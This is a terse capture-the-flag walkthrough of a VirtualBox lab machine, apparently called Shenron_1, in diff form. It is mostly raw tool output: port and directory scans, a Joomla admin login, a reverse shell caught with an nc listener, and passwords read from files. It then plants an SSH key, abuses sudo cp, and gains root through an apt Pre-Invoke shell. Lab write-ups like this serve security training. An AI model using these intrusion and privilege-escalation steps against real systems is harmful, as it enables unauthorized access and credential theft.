@@ -1,0 +1,189 @@
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-16 18:18 CEST
+Nmap scan report for 192.168.43.159
+Host is up (0.00033s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 0e:22:60:0a:f7:d4:78:f6:42:08:d7:6a:6b:b0:b1:62 (RSA)
+|   256 b3:0c:cd:0a:67:c3:ab:d2:23:27:02:1f:b2:fb:91:12 (ECDSA)
+|_  256 29:73:e0:f2:6d:f6:fb:de:4c:6f:b2:7a:19:69:f5:82 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Apache2 Debian Default Page: It works
+MAC Address: 08:00:27:00:18:E9 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.33 ms 192.168.43.159
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 10.17 seconds
+
+root@kali:~# gobuster dir -u 192.168.43.159 -w /usr/share/wordlists/dirbuster/directory-lihtml,php,sql
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.43.159
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              sql,txt,html,php
+[+] Timeout:                 10s
+===============================================================
+2021/04/16 18:18:19 Starting gobuster in directory enumeration mode
+===============================================================
+/index.html           (Status: 200) [Size: 10701]
+/test                 (Status: 301) [Size: 315] [--> http://192.168.43.159/test/]
+/joomla               (Status: 301) [Size: 317] [--> http://192.168.43.159/joomla/]
+/server-status        (Status: 403) [Size: 279]                                    
+                                                                                   
+===============================================================
+2021/04/16 18:23:59 Finished
+===============================================================
+
+
+admin:3iqtzi4RhkWANcu@$pa$$
+
+
+joomla --> creds
+
+
+Edit index.php and then launch preview...
+reverse shell booommmmm
+
+root@kali:~/CTF/Shenron_1# nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [192.168.43.254] from (UNKNOWN) [192.168.43.159] 53728
+Linux shenron 5.4.0-58-generic #64-Ubuntu SMP Wed Dec 9 08:16:25 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 00:03:10 up 21 min,  0 users,  load average: 0.03, 1.04, 1.61
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+
+-->cat configuration.php
+        public $dbtype = 'mysqli';
+        public $host = 'localhost';
+        public $user = 'jenny';
+        public $password = 'Mypa$$wordi$notharD@123';
+
+
+www-data@shenron:/var/www/html/joomla$ su jenny
+su jenny
+Password: Mypa$$wordi$notharD@123
+
+jenny@shenron:/var/www/html/joomla$ id
+id
+uid=1001(jenny) gid=1001(jenny) groups=1001(jenny)
+jenny@shenron:/var/www/html/joomla$ 
+
+jenny@shenron:~/.ssh$ touch authorized_keys
+touch authorized_keys
+jenny@shenron:~/.ssh$ ls -la
+ls -la
+total 12
+drwxrwxr-x 2 jenny jenny 4096 Apr 17 00:09 .
+drwx------ 3 jenny jenny 4096 Dec 13 19:16 ..
+-rw-rw-r-- 1 jenny jenny    0 Apr 17 00:09 authorized_keys
+-rw-r--r-- 1 jenny jenny  222 Dec 13 17:52 known_hosts
+jenny@shenron:~/.ssh$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCrh/6qYKKvZb8m2GJ97xAKwULXl6gAIhk4+1hs+zz6IDpviqMZnx/QsmemVtAMbZJ14R8/1QF/VHRnRRG3DkNx+uRau9mngz8SbVamWvHZRCVLce-------------vLWdAN2KZmi1X6Q74pLgtA5hkuOa9p05JltZYWXzAtaR20BJDUP2x6OsGfr3xIZUFNdgU0cguml5RDJ9RuhEYDpBObr8krZPgS/n0szjw9byDDlHmLAty8rl+G0oLMCkFcMdgEYC2qu+3hLlDDh6iIqOBv985em9IjJE9B0QcksfiDd1s9gSFadc538Y6xIf8/RSEFmxxjJm/Qy61EPib+k1BQhreOlGQvQNEQoNsp6ZuASPJnYHM= root@kali" >> authorized_keys
+<vQNEQoNsp6ZuASPJnYHM= root@kali" >> authorized_keys
+jenny@shenron:~/.ssh$ 
+
+root@kali:~/CTF/Shenron_1# ssh jenny@192.168.43.159 -i /root/.ssh/id_rsa 
+The authenticity of host '192.168.43.159 (192.168.43.159)' can't be established.
+ECDSA key fingerprint is SHA256:g7OH7xlX0hIadHAVMFKlrgpzBsNc90HPNtVjbGnebhQ.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.43.159' (ECDSA) to the list of known hosts.
+Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-58-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+Last login: Sat Dec 12 19:04:10 2020 from 192.168.1.5
+jenny@shenron:~$ 
+
+
+
+jenny@shenron:~$ sudo -l
+Matching Defaults entries for jenny on shenron:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User jenny may run the following commands on shenron:
+    (shenron) NOPASSWD: /usr/bin/cp
+
+jenny@shenron:~/.ssh$ sudo -u shenron /usr/bin/cp authorized_keys /home/shenron/.ssh/
+
+
+root@kali:~/CTF/Shenron_1# ssh shenron@192.168.43.159 -i /root/.ssh/id_rsa 
+Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-58-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+Last login: Sun Dec 13 17:52:12 2020 from 127.0.0.1
+shenron@shenron:~$ 
+
+
+
+shenron@shenron:~$ cat local.txt 
+098bf43cc909e1f89bb4c910bd31e1d4
+shenron@shenron:~$ 
+
+shenron@shenron:/var/opt$ cat password.txt 
+shenron : YoUkNowMyPaSsWoRdIsToStRoNgDeAr
+
+shenron@shenron:/var/opt$ sudo -l
+[sudo] password for shenron: 
+Matching Defaults entries for shenron on shenron:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User shenron may run the following commands on shenron:
+    (ALL : ALL) /usr/bin/apt
+
+
+shenron@shenron:/var/opt$ sudo /usr/bin/apt update -o APT::Update::Pre-Invoke::=/bin/sh
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# cat /root/root.txt
+                                                               
+  mmmm  #                                                mmm   
+ #"   " # mm    mmm   m mm    m mm   mmm   m mm            #   
+ "#mmm  #"  #  #"  #  #"  #   #"  " #" "#  #"  #           #   
+     "# #   #  #""""  #   #   #     #   #  #   #   """     #   
+ "mmm#" #   #  "#mm"  #   #   #     "#m#"  #   #         mm#mm 
+                                                               
+Your Root Flag Is Here :- aa087b2d466cd593622798c8e972bffb
+
+
+
+If You Like This Machine Follow Me On Twitter..
+Twitter Handle:-    https://twitter.com/shubhammandloi or @shubhammandloi  
